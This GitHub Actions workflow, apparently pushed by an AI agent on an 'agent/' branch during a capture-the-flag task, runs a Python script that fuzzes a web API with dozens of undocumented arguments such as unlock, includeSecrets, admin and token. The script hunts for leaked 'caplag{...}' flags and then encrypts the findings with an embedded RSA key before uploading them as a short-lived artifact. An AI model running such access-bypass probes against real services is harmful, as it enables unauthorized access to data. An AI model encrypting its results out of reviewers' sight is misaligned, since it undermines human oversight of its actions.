name: launchlet-part3-extraargs
on:
  push:
    branches: [agent/launchlet-part3-extraargs-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Probe undocumented inspectDeploy args and encrypt anomalies
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
          h={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':'launchlet-demo-board','apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
          url=base+'/api/actions/invoke'; aid='act_6f4b9a2c1d0e8a71'
          baseargs={'workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'}
          br=s.post(url,headers=h,json={'actionId':aid,'args':baseargs},timeout=8); baseline=br.text
          keys=['unlock','unlockRef','unlockToken','locked','export','exportRef','exportToken','include','includeSecrets','includeDeploy','includeArtifact','includeMetadata','details','full','debug','admin','internal','release','publish','promote','finalize','approve','proof','token','receipt','buildReceipt','previewReceipt','previewRef','artifact','artifactRef','deployment','deploymentRef','secret','secrets','view','format']
          vals=['preview-8b11c','8b11c','lrec_preview_demo_2026',True,1,'true','unlock','export','deploy','full','internal','production','enterprise']
          high=[
            ('unlock','preview-8b11c'),('unlockRef','preview-8b11c'),('unlockToken','preview-8b11c'),('proof','preview-8b11c'),('token','preview-8b11c'),
            ('receipt','lrec_preview_demo_2026'),('buildReceipt','lrec_preview_demo_2026'),('previewReceipt','lrec_preview_demo_2026'),
            ('export',True),('export','preview-8b11c'),('includeSecrets',True),('includeDeploy',True),('includeArtifact',True),('details','full'),('full',True),('debug',True),('admin',True),('internal',True),
            ('artifactRef','preview-8b11c'),('deploymentRef','preview-8b11c'),('previewRef','preview-8b11c')]
          tests=list(high)
          for k in keys:
            for v in ['preview-8b11c',True,'export']:
              if (k,v) not in tests:tests.append((k,v))
          res=[]
          for k,v in tests:
            args={**baseargs,k:v}
            try:r=s.post(url,headers=h,json={'actionId':aid,'args':args},timeout=8)
            except Exception as e:res.append({'key':k,'value':v,'error':repr(e)});continue
            if r.text!=baseline or r.status_code!=br.status_code:
              item={'key':k,'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};res.append(item)
              flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
              if flags:(out/'FOUND.txt').write_text(r.text);break
          (out/'summary.json').write_text(json.dumps({'baseline':baseline,'tested':len(tests),'anomalies':res},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-extraargs-encrypted
          path: artifact/
          retention-days: 1
